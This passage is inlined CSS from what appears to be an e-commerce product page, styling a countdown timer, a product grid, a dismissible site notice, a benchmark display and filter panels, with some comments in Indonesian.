  min-width:58px; height:40px; padding:0 .4rem;
  background:var(--cd-box);
  color:var(--cd-box-text);
  border:1px solid rgba(15,23,42,.08);
  border-radius:10px;
  font: 800 1.05rem ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", monospace;
  letter-spacing:.5px;
  box-shadow: 0 4px 14px -6px rgba(0,0,0,.4), inset 0 1px 0 rgba(255,255,255,.55);
}
.pd-countdown-modern .unit-label{
  font-size:.62rem; font-weight:700; opacity:.9; text-shadow:0 1px 0 rgba(255,255,255,.15);
}

.pd-countdown-modern .colon{
  font-weight:900; font-size:1.05rem; opacity:.95; transform: translateY(-2px);
  animation: cdBlink 1.2s infinite steps(2, jump-none);
}
@keyframes cdBlink { 0%{opacity:1} 50%{opacity:.25} 100%{opacity:1} }

.pd-countdown-modern .pd-cd-progress{
  display:none;
  position:relative;
  height:6px; border-radius:999px; overflow:hidden;
  background:rgba(255,255,255,.25);
  border:1px solid rgba(255,255,255,.28);
}
.pd-countdown-modern .pd-cd-progress .bar{
  height:100%; width:0%; background:linear-gradient(90deg,#22c55e,#a3e635);
  box-shadow: 0 2px 8px rgba(0,0,0,.25) inset;
  transition:width .35s ease;
}

/* State saat hampir habis */
.pd-countdown-modern.danger{
  --cd-bg1:#8adeff; /* orange-500 */
  --cd-bg2:#8adeff; /* red-500   */
}

/* Responsive */
@media (max-width:640px){
  .pd-countdown-modern{
    padding:.55rem .65rem; border-radius:12px; gap:.6rem;
  }
  .pd-countdown-modern .unit{min-width:52px}
  .pd-countdown-modern .num{min-width:52px;height:36px;font-size:.98rem}
}

/* === Modern Countdown polish (shine + compact) === */
.pd-countdown-modern{
  position:relative;
}
.pd-countdown-modern::after{
  content:"";
  position:absolute; inset:-1px;
  background: linear-gradient(120deg, rgba(255,255,255,.12), rgba(255,255,255,0) 35%),
              radial-gradient(120% 120% at 0% 0%, rgba(255,255,255,.08), rgba(255,255,255,0) 60%);
  border-radius: inherit;
  pointer-events:none;
  mix-blend-mode: screen;
  animation: sheen 4.5s ease-in-out infinite;
}
@keyframes sheen {
  0%   { opacity:.35; transform: translateX(-10%) }
  50%  { opacity:.15; transform: translateX(4%) }
  100% { opacity:.35; transform: translateX(-10%) }
}

/* Mode compact (aktifkan dengan data-mode="compact" di elemen) */
.pd-countdown-modern[data-mode="compact"]{
  gap:.55rem; padding:.5rem .6rem; border-radius:12px;
}
.pd-countdown-modern[data-mode="compact"] .unit{
  min-width:46px;
}
.pd-countdown-modern[data-mode="compact"] .num{
  min-width:46px; height:34px; font-size:.92rem;
}
.pd-countdown-modern[data-mode="compact"] .pd-cd-label{
  font-size:.66rem;
}
.pd-countdown-modern[data-mode="compact"] .pd-cd-icon{
  width:24px; height:24px; border-radius:8px;
}
.pd-countdown-modern[data-mode="compact"] .pd-cd-progress{
  height:5px;
}

/* ============================================================
   Sidebar: shared refinements for medium + tablet (641px â€“ 1250px)
   Buy card = form & paylater on the same row.
   Alt-fintech logos compact (no over-stretching).
   ============================================================ */
@media (min-width:641px) and (max-width:1250px) {
  /* Buy card: put qty/buy buttons and paylater promo inline */
  .pd-buy-card {
    display: flex !important;
    flex-direction: row;
    flex-wrap: wrap;
    align-items: center;
    gap: .6rem .75rem;
  }
  .pd-buy-card .pd-buy-form { flex: 1 1 0; min-width: 0; }
  .pd-buy-card .paylater-promo {
    flex: 0 0 auto;
    align-self: center;
    margin: 0;
    max-width: 44%;
  }

  /* Alt-fintech banner: tighter logos */
  .iab-logos-compact {
    justify-content: center;
    gap: 1.25rem;
  }
  .iab-logos-compact .logo-fin {
    width: auto;
    max-height: 28px;
    object-fit: contain;
  }
}

/* ============================================================
   Tablet layout (641px â€“ 880px)
   Restores 2-column grid + horizontal sidebar for mid-size screens.
   Overrides the generic â‰¤880px mobile-collapse rules above.
   ============================================================ */
@media (min-width:641px) and (max-width:880px) {
  /* 2-column grid: image-card | info-card */
  .pd-top-layout {
    grid-template-columns: minmax(260px, 40%) 1fr;
    gap: 1rem;
  }

  /* Sidebar: full-width horizontal flex row below the two main columns */
  .pd-sidebar {
    grid-column: 1 / -1;
    flex-direction: row;
    flex-wrap: wrap;
    gap: .75rem;
    padding: 0;
  }
  /* Banner cards fill 2-per-row */
  .pd-side-card { flex: 1 1 calc(50% - .375rem); }
  /* Buy card: full row (tallest card â€“ avoids white-space gap if shared with shorter banners) */
  .pd-buy-card  { display: block !important; flex: 0 0 100%; }

  /* Hide installment simulator + alt-fintech banner on tablet (too much vertical space) */
  .pd-installment-card2,
  .inst-alt-banner--compact { display: none !important; }

  /* Restore sticky add-to-cart header (hidden at â‰¤880px by default) */
  .pd-sticky-header { display: flex !important; }

  /* Typography â€“ tighten slightly to fit the narrower info column */
  .pd-price-current { font-size: 1.65rem; }
  .pd-title         { font-size: 1.1rem;  }
  .pd-info-card     { padding: 1.1rem 1.2rem 1.5rem; }
}
</style>
  <style data-inlined="product-grid.css">
/* Product Grid (Firebird) */

.product-archive {
  max-width: 1320px;
  margin-inline: auto;
  padding: 0 0 3rem;
  /*font-family: system-ui,-apple-system,Segoe UI,Roboto,Ubuntu,sans-serif;*/
}

.pa-toolbar {
  display: flex;
  flex-wrap: wrap;
  gap: 1rem;
  justify-content: space-between;
  align-items: flex-start;
}

.pa-title {
  font-size: 1.4rem;
  margin: 0;
  font-weight: 600;
  line-height: 1.2;
  color: #0f172a;
}

.pa-left {
  display: flex;
  flex-wrap: wrap;
  gap: .75rem;
  align-items: center;
}

.pa-filter-badge {
  background: #f1f5f9;
  border: 1px solid #e2e8f0;
  padding: .45rem .6rem;
  border-radius: 8px;
  font-size: .7rem;
  display: flex;
  align-items: center;
  gap: .4rem;
  line-height: 1;
  color: #475569;
}
.pa-filter-badge strong { color: #0f172a; }
.pa-filter-badge .clear {
  display:inline-block;
  text-decoration:none;
  background:#e2e8f0;
  color:#475569;
  font-weight:600;
  padding:0 .35rem .05rem;
  border-radius:4px;
  transition:.2s;
  font-size:.75rem;
  line-height:1;
}
.pa-filter-badge .clear:hover { background:#cbd5e1; color:#1e293b; }

.pa-right {
  display:flex;
  gap:1rem;
  flex-wrap:wrap;
  align-items:flex-start;
  margin-bottom: 0.5rem;
}

.pa-search {
  display:flex;
  gap:.5rem;
  align-items:center;
  background:#fff;
  border:1px solid #e2e8f0;
  padding:.4rem .5rem;
  border-radius:8px;
}
.pa-search input[type=text] {
  border:0;
  outline:none;
  font-size:.8rem;
  padding:.35rem .4rem;
  min-width:200px;
}
.pa-search button {
  background:#0d6efd;
  border:0;
  color:#fff;
  font-size:.7rem;
  padding:.45rem .75rem;
  border-radius:6px;
  cursor:pointer;
  font-weight:600;
  letter-spacing:.3px;
  transition:.25s;
}
.pa-search button:hover { background:#0b5dc4; }

.pa-sort {
  display:flex;
  gap:.4rem;
  align-items:center;
  font-size:.7rem;
  background:#fff;
  border:1px solid #e2e8f0;
  padding:.4rem .55rem;
  border-radius:8px;
}
.pa-sort select {
  font-size:.75rem;
  padding:.35rem .5rem;
  border:1px solid #cbd5e1;
  border-radius:6px;
  background:#fff;
  outline:none;
}

.pa-empty {
  border:1px dashed #cbd5e1;
  padding:3rem 1rem;
  text-align:center;
  border-radius:12px;
  background:#fff;
}
.pa-empty p {
  margin:0 0 1rem;
  font-size:.9rem;
  color:#475569;
}
.btn-reset {
  display:inline-block;
  background:#0d6efd;
  color:#fff;
  font-size:.7rem;
  padding:.55rem 1rem;
  border-radius:8px;
  text-decoration:none;
  font-weight:600;
  letter-spacing:.4px;
  transition:.25s;
}
.btn-reset:hover { background:#0a58c7; }

/* Grid */
.pa-grid {
  display:grid;
  gap:1rem;
  grid-template-columns:repeat(auto-fill, minmax(180px,1fr));
  align-items:stretch;
}

.pa-card {
  background:#fff;
  border:1px solid #e2e8f0;
  border-radius:12px;
  display:flex;
  flex-direction:column;
  text-decoration:none;
  color:inherit;
  position:relative;
  overflow:hidden;
  transition:.28s cubic-bezier(.4,0,.2,1);
  min-width:0;
  padding: 0;
}
.pa-card:hover {
  transform:translateY(-4px);
  box-shadow:0 8px 22px -8px rgba(0,0,0,.15);
  border-color:#dce2ea;
}

.pa-card .thumb {
  aspect-ratio:1/1;
  background:#f1f5f9;
  display:flex;
  align-items:center;
  justify-content:center;
  overflow:hidden;
  position:relative;
}
.pa-card img {
  width:100%;
  height:100%;
  object-fit:cover;
  display:block;
}
.badge-disc {
  position:absolute;
  top:8px;
  left:8px;
  background:#8adeff;
  color:#fff;
  font-size:.6rem;
  padding:4px 6px 3px;
  border-radius:6px;
  font-weight:700;
  letter-spacing:.4px;
}

.pa-card .body {
  padding:.65rem .7rem .8rem;
  display:flex;
  flex-direction:column;
  gap:.45rem;
  min-height:90px;
}

.pa-card .title {
  font-size:.75rem;
  line-height:1.25;
  margin:0;
  font-weight:600;
  color:#1e293b;
  height:2.4em;
  overflow:hidden;
}

.pa-card .prices {
  display:flex;
  flex-wrap:wrap;
  align-items:baseline;
  gap:.4rem;
}
.pa-card .prices .final {
  font-size:.83rem;
  font-weight:700;
  color:#0d6efd;
}
.pa-card .prices .ori {
  font-size:.63rem;
  text-decoration:line-through;
  color:#94a3b8;
  font-weight:500;
}

.pa-card .cat {
  margin-top:auto;
  font-size:.55rem;
  letter-spacing:.6px;
  text-transform:uppercase;
  background:#f1f5f9;
  border:1px solid #e2e8f0;
  padding:.28rem .45rem .25rem;
  border-radius:20px;
  font-weight:600;
  color:#475569;
  align-self:flex-start;
}
.pa-card .meta-line {
    margin-top:4px;
    font-size:.65rem;
    color:#475569;
}
.pa-card .meta-line .sold {
    display:inline-block;
    background:#f1f5f9;
    padding:2px 6px 3px;
    border-radius:4px;
    font-weight:600;
    letter-spacing:.3px;
    color:#334155;
}

/* Pagination */
.pa-pagination {
  margin-top:2rem;
  display:flex;
  flex-wrap:wrap;
  gap:.4rem;
  justify-content:center;
  font-size:.7rem;
  align-items:center;
}
.pa-pagination a,
.pa-pagination span {
  min-width:34px;
  height:34px;
  display:flex;
  align-items:center;
  justify-content:center;
  border-radius:8px;
  text-decoration:none;
  font-weight:600;
  padding:0 .6rem;
  box-sizing:border-box;
  border:1px solid #e2e8f0;
  background:#fff;
  color:#334155;
  transition:.25s;
}
.pa-pagination a:hover {
  background:#f1f5f9;
  color:#0f172a;
}
.pa-pagination .current {
  background:#0d6efd;
  color:#fff;
  border-color:#0d6efd;
}
.pa-pagination .gap {
  border:none;
  background:transparent;
  font-weight:400;
  color:#94a3b8;
}

/* =============== Mobile Filter Bar (Tokopedia-like) =============== */
.pa-mobile-filterbar{display:none}
@media (max-width: 640px){
  /* sembunyikan tombol lama */
  .pa-btn-filter{display:none}

  .pa-mobile-filterbar{
    display:block;
    position:sticky;
    top:0; /* sesuaikan jika ada header fixed di atas */
    z-index:5;
    background:#fff;
    border-bottom:1px solid #e2e8f0;
    padding:.4rem .5rem;
    margin:-.4rem -1rem .6rem; /* full-bleed di container mobile */
  }
  .pa-mobile-filterbar .mf-scroll{
    display:flex;align-items:center;gap:.5rem;
    overflow-x:auto;
    -webkit-overflow-scrolling:touch;
    scrollbar-width:none;
  }
  .pa-mobile-filterbar .mf-scroll::-webkit-scrollbar{display:none}

  .mf-chip{
    flex:0 0 auto;
    background:#fff;
    color:#334155;
    text-decoration:none;
    border:1px solid #e2e8f0;
    border-radius:999px;
    padding:.44rem .7rem;
    font-size:.78rem;
    font-weight:600;
    letter-spacing:.2px;
    white-space:nowrap;
  }
  .mf-chip:active{transform:scale(.98)}
  .mf-chip.active{
    background:#eaf2ff;
    border-color:#0d6efd;
    color:#0d6efd;
  }

  .mf-filter-btn{
    position:relative;
    flex:0 0 auto;
    width:38px;height:38px;
    border-radius:50%;
    border:1.5px solid #0d6efd;
    background:#fff;
    display:inline-flex;align-items:center;justify-content:center;
    color:#0d6efd;
    cursor:pointer;
  }
  .mf-filter-btn:active{transform:scale(.96)}
  .mf-filter-btn svg{width:18px;height:18px;display:block}
  .mf-filter-btn .mf-badge{
    position:absolute;top:0;right:-4px;
    min-width:18px;height:18px;border-radius:9px;
    background:#8adeff;color:#fff;
    font-size:.65rem;font-weight:700;
    display:flex;align-items:center;justify-content:center;
    padding:0 4px;line-height:1;
    box-shadow:0 2px 6px -2px rgba(239,68,68,.6);
  }
}

/* Responsive */
@media (max-width: 640px) {
  .product-archive { padding: 0 1rem 3rem; }
  .pa-grid { grid-template-columns:repeat(auto-fill,minmax(150px,1fr)); }
  .pa-search input[type=text]{ min-width:140px; }
  .pa-toolbar { flex-direction:column; align-items:stretch; margin-bottom: 0; display: none;}
  .pa-right { display: none; }
  .pa-sort { width: 100%; justify-content:center; }
  .pa-mobile-filterbar { display: flex !important; }
}

.pa-mobile-filterbar {
  display: none;
  align-items: center;
  gap: 8px;
  padding: 8px 0 8px 12px;
  background: #fff;
  width: 100vw;
}
.pa-mobile-filterbar .mf-scroll {
  display: flex;
  gap: 8px;
  overflow-x: auto;
  -webkit-overflow-scrolling: touch;
  scrollbar-width: none; /* Firefox */
  flex: 1 1 auto; /* takes remaining width */
}
.pa-mobile-filterbar .mf-scroll::-webkit-scrollbar { display: none; } /* WebKit */
.pa-mobile-filterbar .mf-chip {
  flex: 0 0 auto; /* prevent shrinking, keep width based on content */
  white-space: nowrap;
}
.pa-mobile-filterbar .mf-filter-btn {
  flex: 0 0 auto; /* do not shrink */
  position: relative; /* keep in place, not inside scroller */
  display: inline-flex;
  align-items: center;
  gap: 6px;
}

/* Optional: ensure on small screens the button stays visible with min width */
@media (max-width: 768px) {
  .pa-mobile-filterbar .mf-filter-btn {
    padding: 6px 10px;
  }
}

/* Product Specification Chips */
.pa-card .spec-chips {
  font-size: .6rem;
  color: #64748b;
  font-weight: 500;
  letter-spacing: .2px;
  margin-top: 2px;
  margin-bottom: 4px;
  line-height: 1.2;
  opacity: 0.9;
  max-width: 100%;
  overflow: hidden;
  text-overflow: ellipsis;
  white-space: nowrap;
}

.pa-card .spec-chips .spec-divider {
  color: #94a3b8;
  font-weight: 400;
  margin: 0 1px;
}
</style>
  <style data-inlined="site-notice.css">
/**
 * Site Notice Banner - Reusable Notification System
 * Dismissible top bar for announcements, holidays, maintenance, etc.
 */

.holiday-notice {
    position: fixed;
    top: 0;
    left: 0;
    right: 0;
    z-index: 9999;
    background: linear-gradient(135deg, #8adeff 0%, #8adeff 100%);
    border-bottom: 2px solid rgba(255, 255, 255, 0.2);
    box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
    animation: slideDown 0.4s cubic-bezier(0.4, 0, 0.2, 1);
    transform-origin: top;
}

.holiday-notice.hidden {
    animation: slideUp 0.3s cubic-bezier(0.4, 0, 0.2, 1) forwards;
}

@keyframes slideDown {
    from {
        transform: translateY(-100%);
        opacity: 0;
    }
    to {
        transform: translateY(0);
        opacity: 1;
    }
}

@keyframes slideUp {
    from {
        transform: translateY(0);
        opacity: 1;
    }
    to {
        transform: translateY(-100%);
        opacity: 0;
    }
}

.holiday-notice-container {
    max-width: 1400px;
    margin: 0 auto;
    padding: 12px 20px;
    display: flex;
    align-items: center;
    justify-content: space-between;
    gap: 16px;
}

.holiday-notice-content {
    display: flex;
    align-items: center;
    gap: 12px;
    flex: 1;
}

.holiday-notice-icon {
    font-size: 20px;
    line-height: 1;
    flex-shrink: 0;
}

.holiday-notice-text {
    color: #ffffff;
    font-size: 14px;
    font-weight: 500;
    line-height: 1.5;
    margin: 0;
    text-shadow: 0 1px 2px rgba(0, 0, 0, 0.2);
}

.holiday-notice-emoji {
    display: inline-block;
    animation: bounce 2s ease-in-out infinite;
}

@keyframes bounce {
    0%, 100% {
        transform: translateY(0);
    }
    50% {
        transform: translateY(-4px);
    }
}

.holiday-notice-close {
    background: rgba(255, 255, 255, 0.2);
    border: 1px solid rgba(255, 255, 255, 0.3);
    border-radius: 6px;
    padding: 6px;
    cursor: pointer;
    color: #ffffff;
    transition: all 0.2s ease;
    flex-shrink: 0;
    display: flex;
    align-items: center;
    justify-content: center;
    width: 32px;
    height: 32px;
}

.holiday-notice-close:hover {
    background: rgba(255, 255, 255, 0.3);
    transform: scale(1.05);
}

.holiday-notice-close:active {
    transform: scale(0.95);
}

.holiday-notice-close:focus {
    outline: 2px solid rgba(255, 255, 255, 0.5);
    outline-offset: 2px;
}

/* Body padding adjustment when banner is visible */
body.has-holiday-notice {
    padding-top: 52px;
}

/* Tablet Styles */
@media (max-width: 1024px) {
    .holiday-notice-container {
        padding: 10px 16px;
    }
    
    .holiday-notice-text {
        font-size: 13px;
    }
    
    .holiday-notice-icon {
        font-size: 18px;
    }
    
    body.has-holiday-notice {
        padding-top: 48px;
    }
}

/* Mobile Styles */
@media (max-width: 640px) {
    .holiday-notice-container {
        padding: 10px 12px;
        gap: 8px;
    }
    
    .holiday-notice-content {
        gap: 8px;
    }
    
    .holiday-notice-text {
        font-size: 12px;
        line-height: 1.4;
    }
    
    .holiday-notice-icon {
        font-size: 16px;
    }
    
    .holiday-notice-close {
        width: 28px;
        height: 28px;
    }
    
    .holiday-notice-close svg {
        width: 16px;
        height: 16px;
    }
    
    body.has-holiday-notice {
        padding-top: 44px;
    }
}
</style>

 <body>

/* Ensure header doesn't get covered - removed z-index as it conflicts with dropdown stacking */
/* .header,
.navbar,
header {
    position: relative;
    z-index: 100;
} */

</style>
        <style data-inlined="benchmark.css">
/**
 * Benchmark Section Styles
 * For product detail page benchmark display
 */

.pd-benchmark-section {
    background: #fff;
    border-radius: 12px;
    padding: 24px;
    margin: 32px 0;
    box-shadow: 0 2px 8px rgba(0,0,0,0.06);
    border: 1px solid #e5e7eb;
}

.benchmark-header {
    margin-bottom: 20px;
}

.benchmark-title {
    font-size: 22px;
    font-weight: 700;
    color: #1a1a1a;
    margin: 0 0 12px 0;
    display: flex;
    align-items: center;
    gap: 8px;
}

.benchmark-hint {
    font-size: 14px;
    color: #6b7280;
    margin: 0;
}

/* Preview Badges */
.benchmark-preview-badges {
    display: flex;
    flex-wrap: wrap;
    gap: 10px;
    margin-top: 12px;
}

.benchmark-badge {
    display: inline-flex;
    align-items: center;
    gap: 6px;
    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
    color: #fff;
    padding: 8px 16px;
    border-radius: 20px;
    font-size: 13px;
    font-weight: 500;
    box-shadow: 0 2px 6px rgba(102, 126, 234, 0.25);
    transition: all 0.2s ease;
}

.benchmark-badge:hover {
    transform: translateY(-2px);
    box-shadow: 0 4px 12px rgba(102, 126, 234, 0.35);
}

.benchmark-badge strong {
    font-weight: 600;
    opacity: 0.9;
}

/* Load Button */
.btn-load-benchmark {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 10px;
    width: 100%;
    max-width: 420px;
    padding: 14px 24px;
    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
    color: #fff;
    border: none;
    border-radius: 8px;
    font-size: 15px;
    font-weight: 600;
    cursor: pointer;
    transition: all 0.3s ease;
    box-shadow: 0 4px 12px rgba(102, 126, 234, 0.3);
    margin: 0 auto;
}

.btn-load-benchmark:hover:not(:disabled) {
    transform: translateY(-2px);
    box-shadow: 0 6px 16px rgba(102, 126, 234, 0.4);
}

.btn-load-benchmark:disabled {
    opacity: 0.6;
    cursor: not-allowed;
}

.btn-load-benchmark .btn-icon {
    font-size: 20px;
}

.btn-load-benchmark.loading .btn-icon {
    animation: spin 1s linear infinite;
}

@keyframes spin {
    from { transform: rotate(0deg); }
    to { transform: rotate(360deg); }
}

/* Benchmark Content */
.benchmark-content {
    margin-top: 24px;
    padding-top: 24px;
    border-top: 2px solid #f3f4f6;
}

.benchmark-loading {
    text-align: center;
    padding: 40px 20px;
    color: #6b7280;
}

.benchmark-loading-spinner {
    width: 48px;
    height: 48px;
    margin: 0 auto 16px;
    border: 4px solid #f3f4f6;
    border-top-color: #667eea;
    border-radius: 50%;
    animation: spin 1s linear infinite;
}

.benchmark-error {
    text-align: center;
    padding: 32px 20px;
    color: #8adeff;
    background: #fee2e2;
    border-radius: 8px;
}

/* Benchmark Data Display */
.benchmark-data-grid {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
    gap: 16px;
    margin-bottom: 24px;
}

.benchmark-card {
    background: linear-gradient(135deg, #667eea15 0%, #764ba215 100%);
    border: 1px solid #e5e7eb;
    border-radius: 10px;
    padding: 18px;
    text-align: center;
    transition: all 0.2s ease;
}

.benchmark-card:hover {
    transform: translateY(-3px);
    box-shadow: 0 6px 16px rgba(102, 126, 234, 0.15);
}

.benchmark-card-label {
    font-size: 13px;
    color: #6b7280;
    font-weight: 500;
    margin-bottom: 8px;
    text-transform: uppercase;
    letter-spacing: 0.5px;
}

.benchmark-card-value {
    font-size: 24px;
    font-weight: 700;
    color: #1a1a1a;
    line-height: 1.2;
}

.benchmark-card-value.large {
    font-size: 28px;
}

.benchmark-card-subtitle {
    font-size: 12px;
    color: #9ca3af;
    margin-top: 4px;
}

/* Spec Details */
.benchmark-specs {
    background: #f9fafb;
    border-radius: 10px;
    padding: 20px;
    margin-top: 20px;
}

.benchmark-specs-title {
    font-size: 16px;
    font-weight: 600;
    color: #1a1a1a;
    margin: 0 0 16px 0;
}

.benchmark-spec-row {
    display: flex;
    justify-content: space-between;
    padding: 10px 0;
    border-bottom: 1px solid #e5e7eb;
}

.benchmark-spec-row:last-child {
    border-bottom: none;
}

.benchmark-spec-label {
    font-size: 14px;
    color: #6b7280;
    font-weight: 500;
}

.benchmark-spec-value {
    font-size: 14px;
    color: #1a1a1a;
    font-weight: 600;
    text-align: right;
}

/* Score Badges */
.benchmark-score-badge {
    display: inline-block;
    padding: 6px 14px;
    border-radius: 20px;
    font-size: 13px;
    font-weight: 600;
    margin-top: 8px;
}

.benchmark-score-badge.excellent {
    background: #10b981;
    color: #fff;
}

.benchmark-score-badge.good {
    background: #3b82f6;
    color: #fff;
}

.benchmark-score-badge.average {
    background: #f59e0b;
    color: #fff;
}

.benchmark-score-badge.poor {
    background: #8adeff;
    color: #fff;
}

/* Attribution */
.benchmark-attribution {
    text-align: center;
    margin-top: 24px;
    padding-top: 20px;
    border-top: 1px solid #e5e7eb;
    font-size: 13px;
    color: #9ca3af;
}

.benchmark-attribution a {
    color: #667eea;
    text-decoration: none;
    font-weight: 500;
}

.benchmark-attribution a:hover {
    text-decoration: underline;
}

/* Responsive */
@media (max-width: 768px) {
    .pd-benchmark-section {
        padding: 16px;
        margin: 20px 0;
    }
    
    .benchmark-title {
        font-size: 18px;
    }
    
    .benchmark-preview-badges {
        flex-direction: column;
        gap: 8px;
    }
    
    .benchmark-badge {
        justify-content: center;
    }
    
    .btn-load-benchmark {
        font-size: 14px;
        padding: 12px 20px;
    }
    
    .benchmark-data-grid {
        grid-template-columns: 1fr 1fr;
        gap: 12px;
    }
    
    .benchmark-card {
        padding: 14px;
    }
    
    .benchmark-card-value {
        font-size: 20px;
    }
    
    .benchmark-spec-row {
        flex-direction: column;
        gap: 4px;
    }
    
    .benchmark-spec-value {
        text-align: left;
    }
}

@media (max-width: 480px) {
    .benchmark-data-grid {
        grid-template-columns: 1fr;
    }
}

</style>
    <style data-inlined="product-filters.css">
/* =========================================================
   Product Filters (Desktop + Mobile Drawer)
   Light Only + FIX:
   - Desktop: f-actions selalu tampil (static bottom)
   - Mobile: konten filter dapat discroll
   ========================================================= */

/* ========== Layout wrapper (tidak mengubah grid produk) ========== */
.product-archive.with-filters .pa-layout {
  display:flex;
  gap:24px;
  align-items:flex-start;
}
.pa-main { flex:1; min-width:0; }

/* =========================================================
   DESKTOP PANEL
   ========================================================= */
.pa-filters {
  width:300px;
  background:linear-gradient(145deg,#ffffff 0%,#f8fafc 55%,#f1f5f9 100%);
  border:1px solid #e2e8f0;
  padding:18px 18px 12px; /* bottom dikurangi karena f-actions punya padding sendiri */
  border-radius:18px;
  position:sticky;
  top:80px;
  height:calc(100vh - 100px); /* tinggi stabil untuk inner scroll */
  font-size:14px;
  box-shadow:0 1px 2px rgba(0,0,0,.04),0 4px 14px rgba(15,23,42,.08);
  backdrop-filter:blur(3px);
  -webkit-backdrop-filter:blur(3px);
  transition:box-shadow .3s, background .4s;
  display:flex;
  flex-direction:column;
  overflow:hidden; /* cegah double scroll, inner yang scroll */
}
.pa-filters::before {
  content:"";
  position:absolute;
  inset:0 auto 0 0;
  width:7px;
  border-radius:18px 0 0 18px;
  background:linear-gradient(180deg,#f59e0b 0%,#ffb53a 35%,#1d6ce0 100%);
}
.pa-filters.active { box-shadow:0 8px 32px -4px rgba(15,23,42,.35); }

/* Scroll area (desktop/mode shared) */
.filters-scroll {
  flex:1;
  min-height:0;          /* wajib agar overflow terbaca dalam flex container */
  overflow:auto;
  padding-right:6px;
  margin-right:-6px;      /* kompensasi scrollbar */
  scrollbar-width:thin;
  overscroll-behavior:contain;
}
.filters-scroll::-webkit-scrollbar { width:8px; }
.filters-scroll::-webkit-scrollbar-thumb {
  background:#cbd5e1;
  border-radius:20px;
  border:2px solid #f1f5f9;
}
.filters-scroll::-webkit-scrollbar-thumb:hover { background:#94a3b8; }

/* Heading */
.pa-filters h2 {
  margin:0 0 14px;
  font-size:20px;
  font-weight:700;
  letter-spacing:.4px;
  line-height:1.15;
  background:linear-gradient(90deg,#0f172a,#1d6ce0 60%,#0f172a);
  -webkit-background-clip:text;
  color:transparent;
  background-size:200% 100%;
  animation:titleSheen 8s linear infinite;
}
@keyframes titleSheen {
  0%{background-position:0 0}
  50%{background-position:100% 0}
  100%{background-position:0 0}
}

/* Form groups */
.pa-filters .f-group { margin-bottom:18px; position:relative; }
.pa-filters label {
  display:block;
  font-weight:600;
  margin:0 0 6px;
  font-size:13px;
  color:#0f172a;
  letter-spacing:.3px;
}

/* Inputs / selects */
.pa-filters input[type=text],
.pa-filters input[type=number],
.pa-filters select {
  width:100%;
  padding:7px 10px;
  border:1px solid #cbd5e1;
  border-radius:8px;
  font-size:13px;
  min-height:34px;
  background:#ffffff;
  box-sizing:border-box;
  color:#0f172a;
  transition:border-color .25s, box-shadow .25s, background .25s;
  -webkit-appearance:none;
  -moz-appearance:none;
  appearance:none;
}
.pa-filters select {
  background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 12 12'%3E%3Cpath fill='%230f172a' d='M6 9L1 4h10z'/%3E%3C/svg%3E");
  background-repeat:no-repeat;
  background-position:right 10px center;
  background-size:12px;
  padding-right:32px;
}
.pa-filters input[type=text]:hover,
.pa-filters input[type=number]:hover,
.pa-filters select:hover { border-color:#94b5ec; }
.pa-filters input[type=text]:focus,
.pa-filters input[type=number]:focus,
.pa-filters select:focus {
  outline:none;
  border-color:#1d6ce0;
  box-shadow:0 0 0 3px rgba(29,108,224,.25);
  background:#f8fbff;
}
.pa-filters .range { display:flex; gap:10px; }
.pa-filters .range input { flex:1; }
.pa-filters .hint { font-size:11px; color:#64748b; margin-top:6px; }

/* Spec blocks */
.f-specs { margin-top:4px; }
.spec-attr {
  margin:0 0 14px;
  padding:12px 12px 10px;
  border:1px solid #e2e8f0;
  border-radius:14px;
  background:linear-gradient(130deg,#ffffff 0%,#f7faff 85%);
  position:relative;
  transition:border-color .3s, box-shadow .3s, background .4s;
}
.spec-attr.collapsed { padding-bottom:8px; }
.spec-attr.has-selected {
  border-color:#1d6ce0;
  box-shadow:0 0 0 2px rgba(29,108,224,.15),0 2px 8px -2px rgba(29,108,224,.35);
  background:linear-gradient(135deg,#ffffff 0%,#e9f2ff 100%);
}
.spec-attr-title {
  font-weight:600;
  margin:0 0 8px;
  font-size:13px;
  display:flex;
  justify-content:space-between;
  align-items:center;
  cursor:pointer;
  color:#0f172a;
  user-select:none;
}
.spec-attr-title .chevron {
  font-size:10px;
  transition:transform .25s, opacity .25s;
  opacity:.65;
}
.spec-attr.collapsed .spec-attr-title .chevron {
  transform:rotate(-90deg);
  opacity:.5;
}

/* Spec options */
.spec-attr-options { display:flex; flex-wrap:wrap; gap:6px; }
.spec-attr-options label {
  display:inline-flex;
  align-items:center;
  gap:4px;
  font-weight:500;
  border:1px solid #d4dde7;
  padding:6px 9px;
  border-radius:30px;
  cursor:pointer;
  background:#f3f6fa;
  font-size:12px;
  line-height:1.1;
  transition:background .25s, border-color .25s, color .25s, box-shadow .25s;
  position:relative;
}
.spec-attr-options label:hover { background:#e8f1ff; border-color:#b1cff3; }
.spec-attr-options input {
  margin:0;
  position:absolute;
  inset:0;
  opacity:0;
  cursor:pointer;
}
.spec-attr-options label:has(input:checked) {
  background:linear-gradient(135deg,#1d6ce0 0%,#155ab8 100%);
  border-color:#1d6ce0;
  color:#ffffff;
  box-shadow:0 2px 6px -1px rgba(29,108,224,.55);
}
.spec-attr-options label:has(input:checked)::after {
  content:"";
  position:absolute;
  right:6px;
  top:6px;
  width:6px;
  height:6px;
  background:#fff;
  border-radius:50%;
  box-shadow:0 0 0 4px rgba(255,255,255,.25),0 0 0 7px rgba(29,108,224,.5);
  animation:pulseDot 1.9s ease-out infinite;
}
@keyframes pulseDot {
  0%{transform:scale(.8);opacity:.9}
  60%{transform:scale(1.4);opacity:.15}
  100%{transform:scale(.8);opacity:.9}
}

/* Badges */
.pa-filter-badges { margin:0 0 18px; display:flex; flex-wrap:wrap; gap:6px; }
.pa-filter-badge {
  display:inline-flex;
  gap:6px;
  align-items:center;
  background:linear-gradient(135deg,#eef4ff 0%,#e0edff 100%);
  border:1px solid #b4cff3;
  padding:5px 10px 5px 12px;
  border-radius:22px;
  margin:2px 4px 0 0;
  font-size:11px;
  font-weight:500;
  line-height:1;
  color:#0f172a;
  position:relative;
  overflow:hidden;
}
.pa-filter-badge::before {
  content:"";
  position:absolute;
  inset:0;
  background:linear-gradient(90deg,rgba(255,255,255,0),rgba(255,255,255,.35),rgba(255,255,255,0));
  transform:translateX(-100%);
